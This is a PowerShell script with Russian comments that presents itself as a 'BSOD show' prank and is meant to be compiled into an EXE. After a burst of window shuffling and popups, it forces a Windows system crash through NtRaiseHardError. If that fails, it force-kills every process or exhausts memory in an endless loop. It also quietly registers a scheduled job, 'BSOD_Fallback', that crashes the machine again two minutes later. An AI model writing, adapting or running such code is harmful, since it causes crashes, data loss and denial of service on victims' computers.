<#
    Скрипт "Шоу с BSOD" для Windows
    Перед запуском убедитесь, что у вас есть права администратора.
    Конвертируется в EXE через PS2EXE.
    Рекомендуется тестировать в виртуальной машине.
#>

# Добавляем необходимые типы для работы с WinAPI и Windows Forms
Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class BSOD {
        [DllImport("ntdll.dll", SetLastError=true)]
        public static extern void RtlAdjustPrivilege(int Privilege, bool Enable, int CurrentThread, out bool Enabled);
        [DllImport("ntdll.dll", SetLastError=true)]
        public static extern void NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
    }
"@

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Функция для случайной паузы
function Get-RandomDelay {
    param($MinMs = 300, $MaxMs = 1200)
    Start-Sleep -Milliseconds (Get-Random -Minimum $MinMs -Maximum $MaxMs)
}

# Функция "визуального шоу" - случайные эффекты
function Start-VisualShow {
    param([int]$DurationSeconds = 30)
    
    $endTime = (Get-Date).AddSeconds($DurationSeconds)
    Write-Host "[*] Начинаем визуальное шоу на $DurationSeconds секунд..." -ForegroundColor Yellow
    
    while ((Get-Date) -lt $endTime) {
        $effectType = Get-Random -Minimum 1 -Maximum 4
        
        switch ($effectType) {
            1 { 
                # Эффект 1: Случайное перемещение всех видимых окон
                $windows = Get-Process | Where-Object { $_.MainWindowTitle } | Select-Object -First 10
                foreach ($window in $windows) {
                    try {
                        $rect = New-Object System.Drawing.Rectangle(
                            (Get-Random -Minimum 0 -Maximum 1000),
                            (Get-Random -Minimum 0 -Maximum 700),
                            400, 300
                        )
                        [System.Windows.Forms.Form]::FromHandle($window.MainWindowHandle).Bounds = $rect
                    } catch {}
                    Get-RandomDelay -MinMs 50 -MaxMs 200
                }
                Write-Host "[*] Эффект: хаотичное перемещение окон" -ForegroundColor Cyan
            }
            2 { 
                # Эффект 2: Инверсия цветов экрана (через мигание консоли)
                $colors = @("Black","White","Red","Green","Blue","Yellow","Magenta","Cyan")
                $bg = Get-Random -InputObject $colors
                $fg = Get-Random -InputObject $colors | Where-Object { $_ -ne $bg }
                [Console]::BackgroundColor = $bg
                [Console]::ForegroundColor = $fg
                cls
                Write-Host "[*] Эффект: смена цветов консоли" -ForegroundColor $fg -BackgroundColor $bg
                Get-RandomDelay -MinMs 500 -MaxMs 1500
            }
            3 { 
                # Эффект 3: Создание и удаление всплывающих окон
                $popupCount = Get-Random -Minimum 1 -Maximum 5
                for ($i=0; $i -lt $popupCount; $i++) {
                    $form = New-Object System.Windows.Forms.Form
                    $form.Size = New-Object System.Drawing.Size(300,150)
                    $form.StartPosition = 'Manual'
                    $form.Location = New-Object System.Drawing.Point(
                        (Get-Random -Minimum 0 -Maximum 1200),
                        (Get-Random -Minimum 0 -Maximum 800)
                    )
                    $form.Text = "Эффект $i"
                    $form.BackColor = [System.Drawing.Color]::FromArgb(
                        (Get-Random -Minimum 0 -Maximum 256),
                        (Get-Random -Minimum 0 -Maximum 256),
                        (Get-Random -Minimum 0 -Maximum 256)
                    )
                    $form.Show()
                    Get-RandomDelay -MinMs 300 -MaxMs 800
                    $form.Close()
                    $form.Dispose()
                }
                Write-Host "[*] Эффект: всплывающие окна" -ForegroundColor Magenta
            }
        }
        Get-RandomDelay -MinMs 800 -MaxMs 2000
    }
    
    Write-Host "[!] Визуальное шоу завершено. Подготовка к BSOD..." -ForegroundColor Red
}

# Функция вызова синего экрана смерти (BSOD)
function Invoke-BSOD {
    Write-Host "[!!!] АКТИВАЦИЯ BSOD ЧЕРЕЗ 5 СЕКУНД!!!" -ForegroundColor Red -BackgroundColor White
    for ($i=5; $i -gt 0; $i--) {
        Write-Host "Осталось $i секунд..." -ForegroundColor Yellow
        Start-Sleep -Seconds 1
    }
    
    try {
        # Попытка 1: Использование WinAPI вызова (работает на многих системах)
        $enabled = $false
        [BSOD]::RtlAdjustPrivilege(19, $true, 0, [ref]$enabled)
        $response = 0
        [BSOD]::NtRaiseHardError(0xc0000022, 0, 0, [IntPtr]::Zero, 6, [ref]$response)
    } catch {
        Write-Host "[!] WinAPI метод не сработал, пробуем альтернативы..." -ForegroundColor Red
        try {
            # Попытка 2: Использование утилиты (если есть в системе)
            $proc = Start-Process -FilePath "cmd.exe" -ArgumentList "/c taskkill /f /fi `"pid ne 0`"" -Verb RunAs -PassThru -ErrorAction Stop
            Start-Sleep -Seconds 2
            if ($proc.HasExited -eq $false) {
                Stop-Process -Id $proc.Id -Force
            }
        } catch {
            # Попытка 3: Крайний вариант - переполнение памяти
            Write-Host "[!] Используем крайний метод..." -ForegroundColor Red
            $null = New-Object System.Collections.ArrayList
            while ($true) {
                $arr = New-Object byte[] 1GB
                [System.GC]::Collect()
            }
        }
    }
}

# Основная логика скрипта
try {
    # Проверяем права администратора (рекомендуется для BSOD)
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if (-not $isAdmin) {
        Write-Host "[!] Рекомендуется запустить скрипт от имени администратора для полного эффекта." -ForegroundColor Yellow
    }
    
    # Настройка длительности шоу (по умолчанию 30 секунд)
    $showDuration = 30
    if ($args[0] -match '^\d+$') {
        $showDuration = [int]$args[0]
        if ($showDuration -lt 5) { $showDuration = 5 }
        if ($showDuration -gt 300) { $showDuration = 300 }
    }
    Write-Host "[*] Длительность шоу: $showDuration секунд" -ForegroundColor Green
    
    # Запускаем визуальное шоу
    Start-VisualShow -DurationSeconds $showDuration
    
    # Запускаем BSOD
    Invoke-BSOD
    
} catch {
    Write-Host "[ОШИБКА] Непредвиденная ошибка: $_" -ForegroundColor Red
    Write-Host "Скрипт завершен." -ForegroundColor Gray
    pause
}

# Скрытый вызов BSOD на случай, если основной не сработал (запуск через 2 минуты как фолбэк)
$action = {
    try {
        [BSOD]::RtlAdjustPrivilege(19, $true, 0, [ref]$false)
        $response = 0
        [BSOD]::NtRaiseHardError(0xc0000022, 0, 0, [IntPtr]::Zero, 6, [ref]$response)
    } catch {}
}
$trigger = New-JobTrigger -Once -At (Get-Date).AddMinutes(2)
Register-ScheduledJob -Name "BSOD_Fallback" -ScriptBlock $action -Trigger $trigger -ErrorAction SilentlyContinue
